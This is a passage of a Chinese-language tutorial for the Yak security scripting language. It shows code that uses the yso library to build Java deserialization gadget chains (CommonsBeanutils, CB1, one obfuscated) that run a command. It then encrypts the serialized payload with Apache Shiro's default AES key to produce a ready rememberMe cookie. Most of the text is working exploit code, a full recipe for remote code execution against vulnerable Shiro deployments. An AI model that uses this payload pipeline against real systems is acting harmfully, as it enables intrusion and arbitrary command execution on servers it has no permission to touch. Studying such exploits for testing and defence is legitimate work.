...
- **可离线验证的示例**（`yso` 生成利用链、`codec` 加解密）：用 `assert` 锁定确定性结论（如 Java 序列化流以魔数 `0xAC 0xED` 开头、AES 密钥长度等），均已 `yak` 实跑验证。
- **展示性示例**（依赖 `.class` 文件、向真实目标发包等）：保留为示意代码，运行结果以正文说明为准。
- 结构体/类型定义使用 `text` 高亮，Yak 代码统一使用 `yak` 高亮。
:::
...
``````````````yak
// 特性: 用 yso 生成 CommonsBeanutils 利用链并序列化为字节流
// 关键词: yso.GetCommonsBeanutils183NOCCJavaObject, yso.useRuntimeExecEvilClass, yso.ToBytes
gadgetObj = yso.GetCommonsBeanutils183NOCCJavaObject(yso.useRuntimeExecEvilClass("whoami"))~
gadgetBytes = yso.ToBytes(gadgetObj)~
// Java 序列化流以魔数 0xAC 0xED 开头
assert gadgetBytes[0] == 0xAC && gadgetBytes[1] == 0xED, "java serialized stream should start with AC ED"
assert len(gadgetBytes) > 0, "gadget bytes should not be empty"
``````````````
...
gadgetObj = yso.GetCommonsBeanutils183NOCCJavaObject(yso.useRuntimeExecEvilClass("whoami"))~
gadgetBytes = yso.ToBytes(gadgetObj)~
assert gadgetBytes[0] == 0xAC && gadgetBytes[1] == 0xED, "ToBytes output should be a java serialized stream"
``````````````
...
``````````````yak
// 特性: 生成 CB1 利用链, 并配置 class 版本/命令/类名
// 关键词: yso.GetCommonsBeanutils1JavaObject, yso.evilClassName, yso.majorVersion
version = 52
command = "whoami"
className = "djRiEemN"
...
gadgetBytes = yso.ToBytes(gadgetObj)~
assert gadgetBytes[0] == 0xAC && gadgetBytes[1] == 0xED, "CB1 gadget should be a java serialized stream"
``````````````
...
``````````````yak
// 特性: 生成带混淆的 CB1 利用链(ProcessBuilder 执行命令)
// 关键词: yso.GetCommonsBeanutils1JavaObject, yso.useProcessBuilderExecEvilClass, yso.obfuscationClassConstantPool
version = 52
command = "whoami"
className = "guAVnGeu"
log.setLevel("info")
...
gadgetBytes = yso.ToBytes(gadgetObj)~
assert gadgetBytes[0] == 0xAC && gadgetBytes[1] == 0xED, "shiro gadget should be a java serialized stream"
``````````````

Shiro的Cookie默认使用默认key的cbc加密，所以需要再对payload加密，得到remberMe：

``````````````yak
// 特性: 用 Shiro 默认 key 对 payload 做 AES-CBC 加密并 Base64
// 关键词: codec.DecodeBase64, codec.PKCS5Padding, codec.AESCBCEncrypt, codec.EncodeBase64
// 续上文: gadgetBytes 为利用链序列化字节流(此处为便于独立运行重新生成)
gadgetBytes = yso.ToBytes(yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"), yso.evilClassName("guAVnGeu"), yso.majorVersion(52))~)~

base64Key = "kPH+bIxk5D2deZiIxcaaaA==" // base64编码的key
key, _ = codec.DecodeBase64(base64Key) // 生成 key
assert len(key) == 16, "shiro default key should be 16 bytes (AES-128)"
payload = codec.PKCS5Padding(gadgetBytes, 16) // PKCS5 填充到 16 字节对齐
assert len(payload) % 16 == 0, "padded payload should align to AES block size"
encodePayload = codec.AESCBCEncrypt(key, payload, nil)~
rememberMe = codec.EncodeBase64(append(key, encodePayload...))
assert len(rememberMe) > 0, "rememberMe cookie should not be empty"
``````````````
